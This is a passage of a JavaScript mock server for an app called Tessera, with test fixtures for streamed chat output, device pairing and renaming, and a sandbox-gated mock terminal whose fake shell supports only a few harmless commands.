  const int = (lo, hi) => lo + Math.floor(r() * (hi - lo + 1));
  const sentence = () => {
    const s = pick(STREAM_SENTENCES);
    return r() < 0.35 ? s.replace(/ the (\w+)/, ` the ${pick(STREAM_TERMS)} $1`) : s;
  };
  const para = (n) => Array.from({ length: n }, sentence).join(' ');
  const list = (n, ordered) => Array.from({ length: n }, (_, i) => `${ordered ? `${i + 1}.` : '-'} ${pick(STREAM_TERMS)}: ${sentence()}`).join('\n');
  const table = (rows) => ['| Host | Role | Disk | Uptime | Notes |', '|---|---|---:|---:|---|',
    ...Array.from({ length: rows }, (_, i) => `| node-${i + 1}.lan | ${pick(['server', 'node', 'nas', 'backup'])} | ${int(20, 4000)} GB | ${int(1, 400)} d | ${pick(STREAM_TERMS)} |`)].join('\n');
  const out = ['# Running the home lab: the whole picture', '', para(4), ''];
  // The heavy ones early, so every size meets them.
  const specials = [
    () => ['## A long stretch of prose', '', para(28)],
    () => ['## Every machine', '', table(45)],
    () => ['## The replay loop', '', streamCode('rust', 180, r)],
    () => ['## Everything to check', '', list(70, false)],
    () => ['## One very long line', '', `The pinned key is \`${Array.from({ length: 1400 }, () => '0123456789abcdef'[int(0, 15)]).join('')}\`, and it never wraps on its own.`],
  ];
  let k = 0;
  while (out.join('\n').length < size) {
    const sec = k + 1;
    if (k < specials.length) out.push(...specials[k](), '');
    out.push(`## ${sec + 1}. ${pick(['Storage', 'Networking', 'Backups', 'Updates', 'Monitoring', 'Access', 'Scheduling', 'Recovery'])}`, '', para(int(3, 6)), '');
    if (r() < 0.8) out.push(list(int(5, 12), r() < 0.3), '');
    if (r() < 0.7) out.push(streamCode(pick(STREAM_LANGS), int(12, 45), r), '');
    if (r() < 0.5) out.push(table(int(5, 14)), '');
    if (r() < 0.4) out.push(`> ${sentence()} ${sentence()}`, '');
    out.push(para(int(2, 4)), '');
    k++;
  }
  return out.join('\n').trimEnd();
}
function streamThinking(size, seed) {
  const r = streamRng(seed + 7);
  const out = [];
  let i = 1;
  while (out.join('\n').length < size) {
    out.push(`${i}. ${STREAM_SENTENCES[Math.floor(r() * STREAM_SENTENCES.length)]} Check \`step ${i}\` against the notes before moving on.`);
    if (i % 6 === 0) out.push('', `So far: ${STREAM_SENTENCES[i % STREAM_SENTENCES.length]}`, '');
    i++;
  }
  return out.join('\n');
}
Object.assign(handlers, {
  // Phone performance tests restore these chats through the normal snapshot and mosaic paths.
  mock_phone_lag(p = {}) {
    const calls = Math.max(1, Math.min(4000, p.calls ?? 3000));
    const chats = Math.max(1, Math.min(12, p.chats ?? 1));
    const completed = !!p.completed_helpers;
    const helpers = Math.max(0, Math.min(completed ? 256 : 32, p.helpers ?? 24));
    const model = { provider: 'openrouter', model: 'mistralai/mistral-small-3.2' };
    const prose = 'A realistic long write-up with **emphasis**, a [reference](https://example.com), and details that stay accessible. '.repeat(15);
    const output = Array.from({ length: 600 }, (_, i) => 'Synthetic result line ' + i + ': ' + 'payload '.repeat(8)).join('\n');
    const parents = [];
    for (let c = 0; c < chats; c++) {
      const id = `ses_lag_${hex(6)}`;
      const items = [U('Read these synthetic project files and report.')];
      for (let i = 0; i < calls; i++) {
        if (!p.single_turn && i % 25 === 0) items.push(A(`## Update ${i}\n\n${prose}`), U(`Continue synthetic task ${i}`));
        const call = `${id}-call-${i}`;
        items.push(A(CALL(call, 'read', { path: `/synthetic/file-${i}`, context: i % 10 === 0 ? output : 'small' })), R(call, 'read', i % 10 === 0 ? output : `Synthetic output ${i}`));
      }
      // Completed handoffs and their DMs survive later parent snapshots.
      for (let i = 0; i < Math.min(256, p.handoffs ?? 0); i++) {
        const bot = state.bots[0], dmId = `${id}-dm-${i}`, call = `${id}-handoff-${i}`;
        const dm = seedSession({ id: dmId, title: `Completed bot task ${i}`, kind: 'channel', bot_id: bot.id, model, created: now() - MIN, updated: now(), items: [{ ...U('Synthetic task'), author: `chat:${id}` }, A('Finished synthetic work')] }, state.providers);
        state.sessions.set(dmId, dm); emitSession(dm);
        items.push(A(CALL(call, 'message_bot', { bot: `@${bot.handle}`, message: 'Synthetic task' })), R(call, 'message_bot', 'Handed over', { details: { background: true, bot: `@${bot.handle}`, session_id: dmId } }), { ...U(`[Reply from @${bot.handle} · 1 min · session ${dmId}]\n\nFinished task ${i}`), author: bot.id });
      }
      // Bot DMs persist incoming authored messages, not ordinary user turns.
      const bot = p.authored_messages ? state.bots[0] : null;
      if (bot) for (const e of items) if (e.kind === 'user') e.author = 'chat:synthetic-sender';
      const rec = seedSession({ id, title: `Synthetic ${calls} calls (${c + 1})`, model, ...(bot ? { kind: 'channel', bot_id: bot.id } : {}), created: now() - 7 * DAY, updated: now() - MIN, items }, state.providers);
      state.sessions.set(id, rec);
      emitSession(rec);
      parents.push(rec.info);
      for (let i = 0; i < helpers; i++) {
        const items = [U('Synthetic read-only check')];
        for (let step = 0; step < (completed ? 20 : 1); step++) {
          const call = `${id}-helper-call-${i}-${step}`;
          items.push(A(CALL(call, 'read', { path: `/synthetic/helper-${i}-${step}` })), R(call, 'read', 'Synthetic helper result'));
        }
        const child = seedSession({ id: `${id}-helper-${i}`, title: `Synthetic helper ${i}`, kind: 'subagent', parent_id: id, parent_call: 'lag-agent', status: completed ? 'idle' : 'running', model, created: now() - MIN + i, updated: now(), items }, state.providers);
        state.sessions.set(child.info.id, child);
        emitSession(child);
      }
    }
    if (p.mosaics) {
      const mosaics = [];
      for (let i = 0; i < parents.length; i += 4) mosaics.push({ id: `mos_lag_${i}`, name: `Synthetic mosaic ${i / 4 + 1}`, layout: 'dwindle', tiles: parents.slice(i, i + 4).map((s) => ({ id: `tile_${s.id}`, session_id: s.id })) });
      setMosaics({ version: state.mosaics.version + 1, mosaics });
    }
    return { parents, entries: state.sessions.get(parents[0].id).entries.length };
  },
  mock_stream(p = {}) {
    const rec = getRec(p);
    if (rec.turn || rec.info.status !== 'idle') throw badRequest('that chat is busy');
    const size = Math.max(200, Math.min(400_000, p.size ?? 50_000));
    const seed = p.seed ?? 1;
    const text = typeof p.text === 'string' ? p.text.slice(0, 400_000) : streamMarkdown(size, seed);
    const thinking = p.thinking ? streamThinking(Math.min(200_000, p.thinking), seed) : undefined;
    const pace = { chunk: p.chunk ?? [2, 12], delay: p.delay ?? [3, 8] };
    const lines = Math.max(0, Math.min(20_000, p.tool_lines ?? 0));
    const scenario = async (t) => {
      if (lines) {
        const out = Array.from({ length: lines }, (_, i) => `test node::sync::case_${String(i + 1).padStart(5, '0')} ... ok (${(i * 7) % 90} ms)`);
        const chunks = [];
        for (let i = 0; i < out.length; i += 4) chunks.push([out.slice(i, i + 4).join('\n') + (i + 4 < out.length ? '\n' : ''), 8]);
        await t.step({ pace, text: 'Running the test suite first.', calls: [{ name: 'bash', args: { command: 'cargo test --workspace' }, exec: { chunks, details: { exit_code: 0 }, text: out.join('\n') } }] });
      }
      await t.step({ pace, thinking, text });
    };
    beginTurn(rec, [{ type: 'text', text: p.prompt ?? 'Write up the whole home lab setup, in detail.' }], { scenario });
    return { ok: true, text, thinking: thinking ?? null };
  },
});

// Persisted long-lived Claude workload for the idle/update performance check.
handlers.mock_ui_busy = (p = {}) => uiBusyFixture(p, { seedSession, addEntry, emitSession, state, Turn, U, A, R, CALL, addNotification });
handlers.mock_transcript_perf = (p = {}) => transcriptPerfFixture(p, { seedSession, emitSession, state, U, A, R, CALL });
// ─── end of STREAM mock handlers ──────────────────────────────────────────────

// ─── DEVICES mock handlers (batch 15: one entry per computer, names) ─────────
// Mirrors crates/core/src/engine/devices.rs. Each device may carry what it reported: `client` (app, phone, browser,
// terminal), `key` (its computer key, never sent to clients), `host`, `model`, and `named` (renamed by the user);
// `kind: 'machine'` marks one paired only as a machine. `list_devices` adds `computer` (the id of the first-paired
// device of its computer, the same on every client) and `client` (as said, else guessed from the name).
// `device_hello { client, computer?, host?, model? }` → this device (never renames it); `rename_device { id, name }`
// → the list (the whole computer takes the name; machine-only logins keep theirs; refused when nothing else is
// there). Both broadcast `machines_changed` when something changed. Tests: `mock_devices { add?: Device[],
// machines?: MachineInfo[] }` adds devices (the test's own paired device stays) and replaces the machines.
const DEVICE_NAME_MAX = 60;
function clientByName(name) {
  const n = name.trim().toLowerCase();
  if (n.startsWith('terminal on ') || n === 'terminal (this machine)') return 'terminal';
  if (n.endsWith('(desktop app)') || ['desktop', 'desktop app', 'linux desktop', 'windows desktop', 'macos desktop'].includes(n)) return 'app';
  if (['android phone', 'android tablet', 'android device', 'ios device'].includes(n)) return 'phone';
  if (['chrome', 'firefox', 'edge', 'safari', 'browser'].some((b) => n === b || n.startsWith(`${b} on `))) return 'browser';
  return 'unknown';
}
function deviceNameHint(d, machineNames) {
  if (d.client === 'phone' || d.client === 'browser') return null;
  if (d.host) return d.host;
  const n = d.name.trim();
  const m = /^terminal on (.+)$/i.exec(n) ?? /^(.+)\(desktop app\)$/i.exec(n);
  const h = m?.[1]?.trim();
  return h || machineNames.get(d.id) || null;
}
/** `list[i].computer`: devices with one key are one computer; older ones join a keyed computer by its name when sure. */
function groupComputers(list, keys, machineNames) {
  const n = list.length;
  const parent = list.map((_, i) => i);
  const root = (i) => {
    while (parent[i] !== i) i = parent[i] = parent[parent[i]];
    return i;
  };
  const join = (a, b) => {
    const ra = root(a);
    const rb = root(b);
    parent[Math.max(ra, rb)] = Math.min(ra, rb);
  };
  const byKey = new Map();
  keys.forEach((k, i) => {
    if (!k) return;
    if (byKey.has(k)) join(byKey.get(k), i);
    else byKey.set(k, i);
  });
  const roots = list.map((_, i) => root(i));
  const byName = new Map();
  const kinds = new Map();
  for (let i = 0; i < n; i++) {
    if (!keys[i]) continue;
    kinds.set(roots[i], [...(kinds.get(roots[i]) ?? []), list[i].client]);
    const h = list[i].host?.trim();
    if (h) {
      const at = byName.get(h.toLowerCase()) ?? [];
      if (!at.includes(roots[i])) at.push(roots[i]);
      byName.set(h.toLowerCase(), at);
    }
  }
  const claims = [];
  for (let i = 0; i < n; i++) {
    if (keys[i]) continue;
    const hint = deviceNameHint(list[i], machineNames);
    const at = hint ? byName.get(hint.trim().toLowerCase()) : null;
    if (!at || at.length !== 1) continue;
    if (!(kinds.get(at[0]) ?? []).includes(list[i].client)) claims.push([at[0], i]);
  }
  for (const [r, i] of claims) {
    if (claims.filter(([r2, j]) => r2 === r && list[j].client === list[i].client).length === 1) join(r, i);
  }
  for (let i = 0; i < n; i++) list[i].computer = list[root(i)].id;
}
function deviceList(conn) {
  const ns = notifyState();
  machinesState(); // machines are paired devices too
  const devices = [...state.devices].sort((a, b) => a.created_at - b.created_at);
  const list = devices.map((d) => {
    const client = d.kind === 'machine' ? 'machine' : d.browser ? 'browser' : d.client && d.client !== 'unknown' ? d.client : clientByName(d.name);
    const out = { id: d.id, name: d.name, created_at: d.created_at, last_seen: d.last_seen, current: d.id === conn?.deviceId, notify: !ns.off.has(d.id), online: deviceOnline(d.id), client };
    // A web browser's login, as the server marks it (`DeviceInfo.browser`).
    if (d.browser) out.browser = true;
    if (d.host) out.host = d.host;
    if (d.model) out.model = d.model;
    if (d.named) out.named = true;
    // A web browser using Tessera (DeviceInfo.browser), as the server marks it.
    if (d.browser) out.browser = true;
    return out;
  });
  groupComputers(list, devices.map((d) => d.key ?? null), new Map(machinesState().map((m) => [m.id, m.name])));
  return list;
}
const cleanLine = (s, max) => String(s ?? '').split('\n').map((l) => l.trim()).find(Boolean)?.replace(/[\u0000-\u001f\u007f​-‏‪-‮⁦-⁩]/g, '').slice(0, max) ?? '';
Object.assign(handlers, {
  list_devices: (_p, conn) => deviceList(conn),
  set_device_notify(p, conn) {
    const id = need(p, 'id');
    if (!state.devices.some((d) => d.id === id)) throw notFound('no such device');
    const ns = notifyState();
    if (p.notify) ns.off.delete(id);
    else ns.off.add(id);
    return deviceList(conn);
  },
  device_hello(p = {}, conn) {
    const dev = state.devices.find((d) => d.id === conn?.deviceId);
    if (!dev) throw notFound('no such device');
    const before = JSON.stringify(deviceList(conn));
    if (['app', 'phone', 'browser', 'terminal'].includes(p.client) && dev.kind !== 'machine') dev.client = p.client;
    if (typeof p.computer === 'string' && /^[0-9a-f]{16,64}$/i.test(p.computer)) dev.key = p.computer;
    const host = cleanLine(p.host, 64);
    if (host) dev.host = host;
    const model = cleanLine(p.model, DEVICE_NAME_MAX);
    if (model) dev.model = model;
    const after = deviceList(conn);
    if (JSON.stringify(after) !== before) broadcast({ type: 'machines_changed' });
    return after.find((d) => d.id === dev.id);
  },
  rename_device(p = {}, conn) {
    const id = need(p, 'id');
    const name = String(p.name ?? '').trim();
    if (!name) throw badRequest('Give it a name.');
    if ([...name].length > DEVICE_NAME_MAX) throw badRequest(`Names can be at most ${DEVICE_NAME_MAX} characters.`);
    if (/[\u0000-\u001f\u007f​-‏‪-‮⁦-⁩]/.test(name)) throw badRequest("Names can't contain line breaks or hidden characters.");
    const list = deviceList(conn);
    const target = list.find((d) => d.id === id);
    if (!target) throw notFound('no such device');
    const renamed = list.filter((d) => (d.id === id || d.computer === target.computer) && d.client !== 'machine');
    if (!renamed.length) throw badRequest(`${target.name} is a machine only: its name can be changed only on that computer (in its Tessera app, or \`tessera node name\`)`);
    for (const d of renamed) {
      const dev = state.devices.find((x) => x.id === d.id);
      log(`device ${d.id} renamed from "${dev.name}" to "${name}" (asked by ${conn?.deviceId ?? '-'})`);
      dev.name = name;
      dev.named = true;
    }
    broadcast({ type: 'machines_changed' });
    return deviceList(conn);
  },
  mock_devices(p = {}) {
    const t = now();
    for (const d of p.add ?? []) state.devices.push({ created_at: t - DAY, last_seen: t - HOUR, current: false, ...d });
    if (Array.isArray(p.machines)) state.machines = p.machines.map(machineCopy);
    broadcast({ type: 'machines_changed' });
    return deviceList(null);
  },
});
// ─── end of DEVICES mock handlers ────────────────────────────────────────────

// ─── TERMINAL mock handlers (batch 15, item 7: a terminal in a tile) ─────────
// Mirrors engine/terminals.rs. `terminal_status` → TerminalStatus; `set_terminal_settings { settings }` →
// TerminalStatus (off by default; "sandboxed" needs `sandbox_ok`, "full" is refused with `strict`; off closes them
// all). `terminal_open { machine?, cols, rows }` → TerminalInfo: only over a private connection, on this server when
// it's on, or on a machine whose scope allows it (online, not paused); at most 4 per device and place, 16 per place.
// Turning terminals on or giving them more needs a private connection (narrowing doesn't). A web browser's login
// (`browser: true` device) is never private and may only ask `terminal_status`. The terminal belongs to
// the device that opened it: other devices are told it isn't open. Its output goes only to the connection showing
// it (`terminal_output { id, seq, data: base64 }`), no further than 256 KiB past what was acknowledged
// (`terminal_ack`); `terminal_attach` sends the kept output again from its start; `terminal_detach` and a closed
// connection leave it waiting (`grace_ms`); `terminal_close` ends it (`terminal_exit`). A device revoked: its
// terminals end at once. The fake shell echoes, edits (Backspace, Ctrl+C, Ctrl+D) and knows `exit [n]`,
// `stty size`, `whoami`, `echo …`, `colors` and `flood <bytes>` (output that waits for acks).
// `mock_terminal { private?, sandbox_ok?, strict?, supported?, grace_ms?, idle_ms?, end?: { id, code?, reason? } }`
// sets what the server would be (tests) and returns { settings, terms: [{ id, owner, conn, machine, cols, rows,
// produced, acked, max_unacked, inputs }] , audit }.
const TERM_WINDOW = 256 << 10;
const TERM_KEEP = 256 << 10;
const connGone = new Set();
function termState() {
  if (!state.terminals) {
    state.terminals = {
      settings: { access: 'off', idle_minutes: 30 },
      private: true, sandbox_ok: true, strict: false, supported: true, grace_ms: 300_000, idle_ms: 0,
      terms: new Map(), ended: new Map(), audit: [],
    };
  }
  return state.terminals;
}
// A web browser's login: its page comes from whoever serves the address, so it never counts as private.
const termFromBrowser = (conn) => !!state.devices.find((d) => d.id === conn?.deviceId)?.browser;
const TERM_FROM_BROWSER = 'Terminals open only from the Tessera app, not from a web browser.';
function termStatus(conn) {
  const T = termState();
  return {
    settings: { ...T.settings },
    supported: T.supported,
    sandbox_ok: T.sandbox_ok,
    sandbox: T.sandbox_ok ? 'on (namespaces + Landlock)' : 'off (Settings → Privacy & safety)',
    strict: T.strict,
    private: T.private && !termFromBrowser(conn),
    max_open: 4,
    grace_secs: Math.round(T.grace_ms / 1000),
    open: [...T.terms.values()].filter((t) => t.owner === conn?.deviceId).map(termInfo),
    recent: T.audit.slice(0, 30).map(({ id: _id, ...a }) => a),
  };
}
const termInfo = (t) => ({ id: t.id, ...(t.machine ? { machine: t.machine } : {}), place: t.place, sandboxed: t.sandboxed, shell: 'bash', started_at: t.started_at });
const termPrompt = (t) => `\x1b[32mme@${t.machine ? 'desktop' : 'mock'}\x1b[0m:\x1b[34m~\x1b[0m$ `;
function termEmit(t, text) {
  const data = Buffer.isBuffer(text) ? text : Buffer.from(text, 'utf8');
  const seq = t.produced;
  t.kept = Buffer.concat([t.kept, data]);
  if (t.kept.length > TERM_KEEP) t.kept = t.kept.subarray(t.kept.length - TERM_KEEP);
  t.produced += data.length;
  if (t.conn && clients.has(t.conn)) {
    t.conn.send({ event: { type: 'terminal_output', id: t.id, seq, data: data.toString('base64') } });
    t.max_unacked = Math.max(t.max_unacked, t.produced - t.acked);
  } else {
    t.acked = t.produced;
  }
}
function termEnd(t, code, reason) {
  const T = termState();
  if (!T.terms.delete(t.id)) return;
  clearTimeout(t.graceTimer);
  clearTimeout(t.idleTimer);
  t.flood = 0;
  const to = t.conn ?? t.lastConn;
  if (to && clients.has(to)) to.send({ event: { type: 'terminal_exit', id: t.id, ...(code != null ? { code } : {}), reason } });
  const a = T.audit.find((x) => x.id === t.id);
  if (a && !a.closed_at) Object.assign(a, { closed_at: now(), ended: reason });
  T.ended.set(t.id, { owner: t.owner, reason });
}
function termPump(t) {
  // `flood`: output as fast as the window lets it go.
  while (t.flood > 0 && termState().terms.has(t.id) && (!t.conn || t.produced - t.acked < TERM_WINDOW)) {
    const n = Math.min(16 << 10, t.flood);
    let line = '';
    while (line.length < n) line += `${String(t.produced + line.length).padStart(9, '0')} y y y y y y y y y y y y\r\n`;
    termEmit(t, line.slice(0, n));
    t.flood -= n;
    if (t.flood <= 0) termEmit(t, termPrompt(t));
  }
}
function termRun(t, line) {
  const cmd = line.trim();
  const [word, ...rest] = cmd.split(/\s+/);
  if (word === 'exit') return termEnd(t, Number(rest[0] ?? 0) || 0, `exited with code ${Number(rest[0] ?? 0) || 0}`);
  let out = '';
  if (!cmd) out = '';
  else if (cmd === 'stty size') out = `${t.rows} ${t.cols}\r\n`;
  else if (cmd === 'whoami') out = 'me\r\n';
  else if (word === 'echo') out = rest.join(' ') + '\r\n';
  else if (cmd === 'colors') out = '\x1b[31mred\x1b[0m \x1b[32mgreen\x1b[0m \x1b[33myellow\x1b[0m \x1b[34mblue\x1b[0m \x1b[1mbold\x1b[0m\r\n';
  else if (word === 'flood') {
    t.flood = Math.max(1, Math.min(8 << 20, Number(rest[0]) || 1 << 20));
    return termPump(t);
  } else out = `${word}: done (mock shell)\r\n`;
  termEmit(t, out + termPrompt(t));
}
function termType(t, data) {
  t.inputs.push(data);
  if (t.inputs.length > 200) t.inputs.shift();
  // Characters typed are echoed together (a long paste is one piece of output).
  let echo = '';
  const flush = () => {
    if (echo && termState().terms.has(t.id)) termEmit(t, echo);
    echo = '';
  };
  for (const seqm of data.match(/\x1b\[[A-D]|\x1b.|[\s\S]/g) ?? []) {
    if (!termState().terms.has(t.id)) return;
    if (seqm.startsWith('\x1b')) continue; // arrows and Alt keys: noted in `inputs` only
    if (seqm >= ' ' && seqm !== '\x7f') {
      t.line += seqm;
      echo += seqm;
      continue;
    }
    flush();
    if (seqm === '\r' || seqm === '\n') {
      termEmit(t, '\r\n');
      const line = t.line;
      t.line = '';
      termRun(t, line);
    } else if (seqm === '\x7f' || seqm === '\b') {
      if (t.line) {
        t.line = t.line.slice(0, -1);
        termEmit(t, '\b \b');
      }
    } else if (seqm === '\x03') {
      t.line = '';
      t.flood = 0;
      termEmit(t, '^C\r\n' + termPrompt(t));
    } else if (seqm === '\x04') {
      if (!t.line) return termEnd(t, 0, 'exited with code 0');
    } else if (seqm === '\t') {
      termEmit(t, '\x07');
    }
  }
  flush();
}
function termOwned(p, conn) {
  const T = termState();
  if (termFromBrowser(conn)) throw new RpcError('unauthorized', TERM_FROM_BROWSER);
  if (!T.private) throw new RpcError('unauthorized', "terminals open only over an end-to-end encrypted connection (the Tessera app) or on the server itself; this connection passes through something that could read it");
  const id = String(need(p, 'id'));
  const t = T.terms.get(id);
  if (!t || t.owner !== conn?.deviceId) {
    const e = T.ended.get(id);
    throw notFound(e && e.owner === conn?.deviceId ? `that terminal ended: ${e.reason}` : "that terminal isn't open any more");
  }
  return t;
}
function termDetach(t) {
  if (!t.conn) return;
  t.lastConn = t.conn;
  t.conn = null;
  t.acked = t.produced;
  clearTimeout(t.graceTimer);
  t.graceTimer = setTimeout(() => termEnd(t, null, `closed because no device showed it for ${Math.round(termState().grace_ms / 60000)} min`), termState().grace_ms);
}
connGone.add((conn) => {
  if (!state.terminals) return;
  for (const t of state.terminals.terms.values()) if (t.conn === conn) termDetach(t);
});
function termIdle(t) {
  const T = termState();
  clearTimeout(t.idleTimer);
  if (T.idle_ms > 0) t.idleTimer = setTimeout(() => termEnd(t, null, 'closed after 30 min without typing'), T.idle_ms);
}
Object.assign(handlers, {
  terminal_status(_p, conn) {
    return termStatus(conn);
  },
  set_terminal_settings(p, conn) {
    const T = termState();
    if (termFromBrowser(conn)) throw new RpcError('unauthorized', TERM_FROM_BROWSER);
    const s = need(p, 'settings');
    const access = oneOf(String(s.access ?? 'off'), ['off', 'sandboxed', 'full'], 'access');
    const rank = { off: 0, sandboxed: 1, full: 2 };
    if (!T.private && rank[access] > rank[T.settings.access]) throw new RpcError('unauthorized', 'terminals can be turned on, or given more, only from the Tessera app or on the server itself; this connection passes through something that could change it');
    if (access !== 'off' && !T.supported) throw badRequest("terminals aren't available on Windows servers yet");
    if (access === 'sandboxed' && !T.sandbox_ok) throw badRequest("the command sandbox is off or incomplete on this server, so terminals can't be kept in it here");
    if (access === 'full' && T.strict) throw badRequest('this server runs everything in the sandbox (sandbox = "strict"), so terminals can only be sandboxed');
    T.settings = { access, idle_minutes: Math.max(15, Math.min(240, Number(s.idle_minutes) || 30)) };
    if (access === 'off') for (const t of [...T.terms.values()]) if (!t.machine) termEnd(t, null, 'terminals were turned off on this server');
    if (access === 'sandboxed') for (const t of [...T.terms.values()]) if (!t.machine && !t.sandboxed) termEnd(t, null, 'terminals here are sandboxed now');
    return termStatus(conn);
  },
  terminal_open(p, conn) {
    const T = termState();
    if (!conn?.deviceId) throw new RpcError('unauthorized', 'terminals open only from one of your paired devices');
    if (termFromBrowser(conn)) throw new RpcError('unauthorized', TERM_FROM_BROWSER);
    if (!T.private) throw new RpcError('unauthorized', "terminals open only over an end-to-end encrypted connection (the Tessera app) or on the server itself; this connection passes through something that could read it");
    const machine = p?.machine ? String(p.machine) : null;
    let place = 'Mock server';
    let sandboxed = T.settings.access === 'sandboxed';
    if (machine) {
      const m = machinesState().find((x) => x.id === machine);
      if (!m) throw notFound("that machine isn't known here any more");
      if (!m.online) throw badRequest(`${m.name} is offline`);
      if (m.paused) throw badRequest(`${m.name} is paused; it can be resumed in Settings → Devices`);
      if (!m.scope.terminal || m.scope.terminal === 'off') throw new RpcError('unauthorized', `terminals are off on ${m.name}; only that computer can turn them on (Settings → Devices → This computer)`);
      place = m.name;
      sandboxed = m.scope.terminal === 'sandboxed';
    } else if (T.settings.access === 'off') {
      throw new RpcError('unauthorized', 'terminals are off on this server; they can be turned on in Settings → Privacy & safety → What commands can reach');
    }
    const there = [...T.terms.values()].filter((t) => (t.machine ?? null) === machine);
    if (there.filter((t) => t.owner === conn.deviceId).length >= 4) throw badRequest('4 terminals of this device are open there already, the most allowed at once; close one first');
    if (there.length >= 16) throw badRequest(`${there.length} terminals are open there already (from all your devices), the most allowed at once; close one first`);
    const id = `t${hex(11)}`;
    const t = {
      id, owner: conn.deviceId, conn, lastConn: conn, machine, place, sandboxed, started_at: now(),
      cols: Number(p?.cols) || 80, rows: Number(p?.rows) || 24, produced: 0, acked: 0, max_unacked: 0,
      kept: Buffer.alloc(0), line: '', inputs: [], flood: 0,
    };
    T.terms.set(id, t);
    T.audit.unshift({ id, opened_at: now(), device: state.devices.find((d) => d.id === conn.deviceId)?.name ?? 'a device', place, sandboxed, ended: '' });
    T.audit.length = Math.min(T.audit.length, 100);
    termIdle(t);
    // The first prompt may come before the answer (as on a real server).
    setTimeout(() => termState().terms.has(id) && termEmit(t, `Welcome to the mock terminal on ${place}.\r\n` + termPrompt(t)), 5);
    return termInfo(t);
  },
  terminal_attach(p, conn) {
    const t = termOwned(p, conn);
    clearTimeout(t.graceTimer);
    t.conn = conn;
    t.lastConn = conn;
    t.cols = Number(p.cols) || t.cols;
    t.rows = Number(p.rows) || t.rows;
    const from = t.produced - t.kept.length;
    t.acked = from;
    const kept = t.kept;
    setTimeout(() => {
      if (t.conn !== conn || !clients.has(conn)) return;
      for (let i = 0; i < kept.length; i += 64 << 10) {
        const piece = kept.subarray(i, i + (64 << 10));
        conn.send({ event: { type: 'terminal_output', id: t.id, seq: from + i, data: piece.toString('base64') } });
      }
      termPump(t);
    }, 5);
    return termInfo(t);
  },
  terminal_detach(p, conn) {
    termDetach(termOwned(p, conn));
    return null;
  },
  terminal_input(p, conn) {
    const t = termOwned(p, conn);
    const data = String(need(p, 'data'));
    if (data.length > 64 << 10) throw badRequest('that is more than 64 KB at once; paste it in parts');
    termIdle(t);
    termType(t, data);
    return null;
  },
  terminal_resize(p, conn) {
    const t = termOwned(p, conn);
    t.cols = Math.max(2, Math.min(1000, Number(p.cols) || t.cols));
    t.rows = Math.max(1, Math.min(500, Number(p.rows) || t.rows));
    return null;
  },
  terminal_ack(p, conn) {
    const t = termOwned(p, conn);
    const upto = Math.min(Number(p.upto) || 0, t.produced);
    if (upto > t.acked) t.acked = upto;
    termPump(t);
    return null;
  },
  terminal_close(p, conn) {
    termEnd(termOwned(p, conn), null, 'closed');
    return null;
  },
  mock_terminal(p = {}) {
    const T = termState();
    for (const k of ['private', 'sandbox_ok', 'strict', 'supported']) if (typeof p[k] === 'boolean') T[k] = p[k];
    for (const k of ['grace_ms', 'idle_ms']) if (typeof p[k] === 'number') T[k] = p[k];
    if (p.end) {
      const t = T.terms.get(String(p.end.id));
      if (t) termEnd(t, p.end.code ?? null, String(p.end.reason ?? 'ended'));
    }
    return {
      settings: { ...T.settings },
      terms: [...T.terms.values()].map((t) => ({ id: t.id, owner: t.owner, conn: t.conn?.id ?? null, machine: t.machine, cols: t.cols, rows: t.rows, produced: t.produced, acked: t.acked, max_unacked: t.max_unacked, inputs: [...t.inputs] })),
      audit: T.audit.map((a) => ({ ...a })),
    };
  },
});
{
  // A signed-out device's terminals end at once.
  const revoke = handlers.revoke_device;
  handlers.revoke_device = (p, conn) => {
    const out = revoke(p, conn);
    if (state.terminals) for (const t of [...state.terminals.terms.values()]) if (t.owner === p.id) termEnd(t, null, 'its device was signed out');
    return out;
  };
}
// ─── end of TERMINAL mock handlers ──────────────────────────────────────────

// ─── startup ────────────────────────────────────────────────────────────────
resetState();
startLocalApp();
const server = http.createServer((req, res) => {
  handleHttp(req, res).catch((err) => {
    console.error('[mock] http error:', err);
    if (!res.headersSent) sendJson(res, 500, { code: 'internal', message: String(err?.message ?? err) });
    else res.destroy();
  });
});
server.on('upgrade', handleUpgrade);
server.on('error', (err) => {
  console.error(`[mock] cannot listen on ${HOST}:${PORT}: ${err.message}`);
  process.exit(1);
});
server.listen(PORT, HOST, () => {
  const host = HOST.includes(':') ? `[${HOST}]` : HOST;
  log(`Tessera mock server listening on http://${host}:${PORT}`);
  log(`pair with code 123456 · ${state.sessions.size} seeded sessions · UI: ${statFile(DIST_DIR) ? DIST_DIR : 'not built (npm run build)'}`);
});
for (const sig of ['SIGINT', 'SIGTERM']) {
  process.on(sig, () => {
    log('shutting down');
    for (const c of [...clients]) c.destroy();
    server.close();
    process.exit(0);
  });
}

// Same consent boundary as engine/voice.rs; the mock never accepts cloud fallback.
function mockVoiceRoute(asked) {
  const choice = state.voice.engine;
  if (choice === 'off' || choice === 'device') throw badRequest('The server does not handle speech with this choice');
  const chosen = ['openai', 'service'].includes(choice) ? choice : 'server';
  if (asked && asked !== 'server' && asked !== chosen) throw badRequest('Choose that speech service in Settings first');
  if ((asked || chosen) === 'openai' && !state.voice.openai_key) throw badRequest('No OpenAI API key is saved');
  return asked || chosen;
}
